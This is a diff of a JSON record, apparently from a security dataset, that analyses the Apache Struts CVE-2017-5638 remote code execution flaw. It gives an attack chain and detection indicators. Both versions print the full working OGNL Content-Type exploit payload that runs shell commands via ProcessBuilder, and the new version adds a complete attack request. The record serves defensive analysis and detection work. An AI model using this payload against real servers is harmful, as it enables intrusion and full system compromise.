@@ -2,34 +2,33 @@
   "package_info": {
     "package_name": "Apache Struts",
     "package_manager": "Maven (Java ecosystem)",
-    "package_versions": "Versions prior to the patched release disclosed on March 7, 2017 (e.g., Struts 2.3.5–2.3.31, 2.5–2.5.10)",
-    "why_malicious": "The affected versions of Apache Struts contained a critical remote code execution (RCE) vulnerability (CVE-2017-5638) that allowed attackers to execute arbitrary code on servers running vulnerable Struts applications. This vulnerability was publicly disclosed and widely exploited, enabling attackers to gain full control of affected systems, as seen in major breaches such as the Equifax incident."
+    "package_versions": "Versions prior to the patched release for CVE-2017-5638 (disclosed March 7, 2017)",
+    "why_malicious": "The affected versions of Apache Struts contained a critical remote code execution (RCE) vulnerability (CVE-2017-5638) that allowed attackers to execute arbitrary code on servers running vulnerable Struts applications. This vulnerability was widely exploited, including in the Equifax breach, due to the failure to promptly patch after public disclosure."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
-        "trigger": "HTTP request processing (when Content-Type header or request parameters are parsed by the Struts framework)",
-        "file_location": "Core Struts framework classes responsible for processing OGNL expressions in request parameters (e.g., org.apache.struts2.dispatcher.Dispatcher, org.apache.struts2.interceptor.StrutsPrepareAndExecuteFilter)",
+        "trigger": "At HTTP request processing time, when a request with a crafted Content-Type header is received",
+        "file_location": "org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest (within vulnerable Struts core JARs, e.g., struts2-core-2.3.XX.jar)",
         "required_permissions": [
           "network (to receive HTTP requests)",
-          "filesystem (to read/write files if exploited)",
-          "process execution (to run system commands via OGNL injection)"
+          "filesystem (for file upload handling and potential command execution)",
+          "process execution (to run arbitrary commands via OGNL injection)"
         ]
       },
-      "code_snippet": "The vulnerability allowed attackers to inject malicious OGNL expressions into HTTP request parameters or headers (such as Content-Type). The Struts framework would then evaluate these expressions without proper sanitization, resulting in arbitrary code execution. For example, an attacker could send a request with a header like: Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
-      "code_language": "Java (OGNL expression injection via HTTP headers/parameters)",
-      "code_behavior": "Processes attacker-supplied OGNL expressions embedded in HTTP request headers or parameters. The framework evaluates these expressions as code, enabling attackers to execute arbitrary system commands on the server with the privileges of the web application process.",
+      "code_snippet": "When a vulnerable Apache Struts application receives an HTTP request with a specially crafted Content-Type header, the Jakarta Multipart parser evaluates the header value as an OGNL expression. If the header contains malicious OGNL code, it is executed in the server context, allowing arbitrary command execution. Example attack request:\n\nPOST /struts2-showcase/upload.action HTTP/1.1\nHost: victim.com\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n\nThis triggers OGNL evaluation and command execution.",
+      "code_language": "java (OGNL injection via HTTP request header)",
+      "code_behavior": "At HTTP request processing time, the Jakarta Multipart parser evaluates the Content-Type header as an OGNL expression, allowing attacker-supplied code to execute arbitrary system commands on the server, resulting in remote code execution and potential full system compromise.",
       "malice_analysis": {
-        "why_suspicious": "User-supplied data, such as HTTP headers or parameters, should never be evaluated as executable code. The framework's failure to properly restrict OGNL expression evaluation allowed attackers to inject and execute arbitrary Java code, leading to full system compromise.",
-        "violated_expectations": "Normal behavior: HTTP request parameters and headers are treated strictly as data and never executed. Malicious behavior: The framework evaluates user-controlled OGNL expressions as code, allowing attackers to run arbitrary system commands.",
-        "similar_legitimate_use": "Expression languages like OGNL are legitimately used for safe, limited dynamic content rendering within templates, but should never allow direct execution of system-level commands or unrestricted access to Java classes from user input.",
+        "why_suspicious": "The code path unsafely evaluates user-supplied HTTP header values as OGNL expressions, directly enabling attackers to inject and execute arbitrary code on the server without authentication.",
+        "violated_expectations": "Normally, HTTP headers are treated as untrusted data and never executed as code. The vulnerability violates this expectation by interpreting header values as executable OGNL, leading to remote code execution.",
+        "similar_legitimate_use": "OGNL expressions are legitimately used for internal data binding and expression evaluation within Struts, but should never be controllable by external user input such as HTTP headers.",
         "key_indicators": [
-          "OGNL expression evaluation triggered by user-supplied HTTP headers or parameters",
-          "Lack of input sanitization or restriction on OGNL expressions",
-          "Presence of system command execution patterns (e.g., java.lang.ProcessBuilder) in evaluated expressions",
-          "Web application logs showing OGNL payloads in HTTP requests",
-          "Unexpected invocation of sensitive Java classes (e.g., java.lang.Runtime, java.lang.ProcessBuilder) from request context"
+          "OGNL expression evaluation triggered by Content-Type HTTP header",
+          "Presence of OGNL syntax (${...} or %{...}) in HTTP headers",
+          "Arbitrary command execution initiated by the web server process in response to HTTP requests",
+          "No authentication or authorization required for exploit to succeed"
         ]
       }
     }
@@ -37,45 +36,52 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker sends a specially crafted HTTP request to a vulnerable Struts endpoint, embedding a malicious OGNL expression in a header (such as Content-Type) or request parameter.",
-      "implemented_by": [
-        "snippet_1"
-      ],
-      "leads_to": "The OGNL expression is parsed and evaluated by the Struts framework during request processing."
+      "action": "Attacker identifies a web application running a vulnerable version of Apache Struts.",
+      "implemented_by": [],
+      "leads_to": "Step 2"
     },
     {
       "step": 2,
-      "action": "The evaluated OGNL expression executes arbitrary Java code, such as invoking java.lang.ProcessBuilder to run system commands with the privileges of the web server process.",
+      "action": "Attacker sends a specially crafted HTTP request with a malicious Content-Type header containing OGNL expressions to the vulnerable endpoint.",
       "implemented_by": [
         "snippet_1"
       ],
-      "leads_to": "Attacker achieves remote code execution on the server."
+      "leads_to": "Step 3"
     },
     {
       "step": 3,
-      "action": "Attacker leverages code execution to exfiltrate sensitive data, install malware, create backdoors, or pivot further into the internal network.",
+      "action": "The vulnerable Jakarta Multipart parser in Struts evaluates the OGNL expression from the Content-Type header, resulting in arbitrary code execution on the server.",
       "implemented_by": [
         "snippet_1"
       ],
-      "leads_to": "Data breach, persistent compromise, or lateral movement within the organization."
+      "leads_to": "Step 4"
+    },
+    {
+      "step": 4,
+      "action": "Attacker gains remote access to the server, enabling data exfiltration, installation of backdoors, or further lateral movement within the network.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Final goal: data breach or system compromise"
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Evaluation of OGNL expressions from user-supplied HTTP headers or parameters",
-      "Execution of system commands (e.g., spawning shell processes) originating from the web application process",
-      "Web server logs containing OGNL payloads or suspicious Java class references in request data",
-      "Unusual or unauthorized file creation or modification by the web server process"
+      "OGNL expression evaluation triggered by HTTP headers, especially Content-Type",
+      "Unexpected process execution (e.g., /bin/bash, cmd.exe) by the web server process",
+      "Inbound HTTP requests with Content-Type headers containing OGNL syntax (%{...} or ${...})",
+      "Web application logs showing errors or stack traces referencing OGNL or ProcessBuilder"
     ],
     "file_indicators": [
-      "Presence of vulnerable Struts JAR files (e.g., struts2-core-2.3.5.jar, struts2-core-2.3.31.jar, struts2-core-2.5.10.jar) in application deployments",
-      "Web application logs showing OGNL expressions or suspicious Java code in HTTP request headers or parameters"
+      "Presence of vulnerable Struts JAR files (e.g., struts2-core-2.3.5.jar, struts2-core-2.3.31.jar) in application deployments",
+      "Web server or application logs containing OGNL expressions in HTTP headers",
+      "Log entries showing unexpected command execution or output in response to HTTP requests"
     ],
     "network_indicators": [
-      "Inbound HTTP requests with OGNL payloads in headers (e.g., Content-Type) or parameters",
-      "Outbound network connections from web servers to external IPs or domains following exploitation",
-      "Unusual traffic patterns from web servers, such as connections to known command-and-control infrastructure"
+      "Inbound HTTP requests with Content-Type headers containing OGNL payloads (e.g., %{...})",
+      "Outbound connections from web servers to external IPs or domains following exploitation",
+      "Unusual HTTP POST requests to Struts endpoints with multipart/form-data and suspicious Content-Type values"
     ],
-    "how_to_detect": "Monitor web application and server logs for OGNL expressions or suspicious Java code in HTTP request headers and parameters. Scan deployed applications for known vulnerable Struts JAR versions. Alert on unexpected system command execution or process spawning by the web server process. Monitor for outbound network connections from web servers to untrusted destinations after suspicious requests. Use vulnerability scanners to identify unpatched Struts components and prioritize remediation."
+    "how_to_detect": "Monitor web server and application logs for HTTP requests with Content-Type headers containing OGNL expressions (e.g., %{...}). Scan deployed applications for vulnerable Struts JAR versions. Use runtime security monitoring to detect unexpected process execution (such as /bin/bash or cmd.exe) by the web server process. Correlate inbound suspicious HTTP requests with subsequent outbound connections or abnormal server behavior to identify exploitation attempts."
   }
 }
